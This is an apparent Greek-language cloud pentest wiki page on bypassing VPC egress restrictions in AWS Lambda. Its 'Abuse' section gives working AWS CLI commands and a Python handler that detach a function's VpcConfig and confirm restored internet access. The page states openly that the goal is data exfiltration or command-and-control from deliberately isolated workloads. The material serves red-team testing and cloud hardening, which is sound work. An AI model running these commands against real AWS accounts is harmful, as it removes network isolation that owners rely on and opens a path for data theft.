# AWS Lambda – VPC Egress Bypass by Detaching VpcConfig

Αναγκάστε μια Lambda function να βγει από ένα περιορισμένο VPC ενημερώνοντας τη διαμόρφωσή της με κενό VpcConfig (SubnetIds=[], SecurityGroupIds=[]). Η function θα τρέχει τότε στο Lambda-managed networking plane, επανακτώντας την εξερχόμενη πρόσβαση στο διαδίκτυο και παρακάμπτοντας τους egress ελέγχους που επιβάλλονται από ιδιωτικά VPC subnets χωρίς NAT.

## Κατάχρηση

- Προαπαιτούμενα: δικαίωμα lambda:UpdateFunctionConfiguration στην στοχευόμενη function (και lambda:InvokeFunction για επαλήθευση), καθώς και δικαιώματα για ενημέρωση κώδικα/handler αν τα αλλάξετε.
- Υποθέσεις: Η function είναι αυτήν τη στιγμή διαμορφωμένη με VpcConfig που δείχνει σε ιδιωτικά subnets χωρίς NAT (οπότε η εξερχόμενη πρόσβαση στο διαδίκτυο είναι αποκλεισμένη).
- Περιοχή: us-east-1

### Βήματα

0) Ετοιμάστε έναν ελάχιστο handler που αποδεικνύει ότι η εξερχόμενη HTTP λειτουργεί

cat > net.py <<'PY'
import urllib.request, json

def lambda_handler(event, context):
try:
ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=3).read().decode().strip()
return {"egress": True, "ip": ip}
except Exception as e:
return {"egress": False, "err": str(e)}
PY
zip net.zip net.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://net.zip --region $REGION || true
aws lambda update-function-configuration --function-name $TARGET_FN --handler net.lambda_handler --region $REGION || true

1) Καταγράψτε την τρέχουσα VPC config (για επαναφορά αργότερα αν χρειαστεί)

aws lambda get-function-configuration --function-name $TARGET_FN --query 'VpcConfig' --region $REGION > /tmp/orig-vpc.json
cat /tmp/orig-vpc.json

2) Αποσυνδέστε το VPC θέτοντας κενές λίστες

aws lambda update-function-configuration \
--function-name $TARGET_FN \
--vpc-config SubnetIds=[],SecurityGroupIds=[] \
--region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done

3) Κάντε invoke και επαληθεύστε την εξερχόμενη πρόσβαση

aws lambda invoke --function-name $TARGET_FN /tmp/net-out.json --region $REGION >/dev/null
cat /tmp/net-out.json

(Optional) Επαναφέρετε την αρχική VPC config

if jq -e '.SubnetIds | length > 0' /tmp/orig-vpc.json >/dev/null; then
SUBS=$(jq -r '.SubnetIds | join(",")' /tmp/orig-vpc.json); SGS=$(jq -r '.SecurityGroupIds | join(",")' /tmp/orig-vpc.json)
aws lambda update-function-configuration --function-name $TARGET_FN --vpc-config SubnetIds=[$SUBS],SecurityGroupIds=[$SGS] --region $REGION
fi

### Επιπτώσεις
- Επαναφέρει την ανεμπόδιστη εξερχόμενη πρόσβαση στο διαδίκτυο από τη function, επιτρέποντας εξαγωγή δεδομένων (data exfiltration) ή C2 από workloads που είχαν σκόπιμα απομονωθεί σε ιδιωτικά subnets χωρίς NAT.

### Παράδειγμα εξόδου (μετά την αποσύνδεση του VpcConfig)

{"egress": true, "ip": "34.x.x.x"}

### Καθαρισμός
- Αν δημιουργήσατε προσωρινές αλλαγές σε κώδικα/handler, επαναφέρετέ τες.
- Προαιρετικά επαναφέρετε το αρχικό VpcConfig που αποθηκεύτηκε στο /tmp/orig-vpc.json όπως φαίνεται παραπάνω.
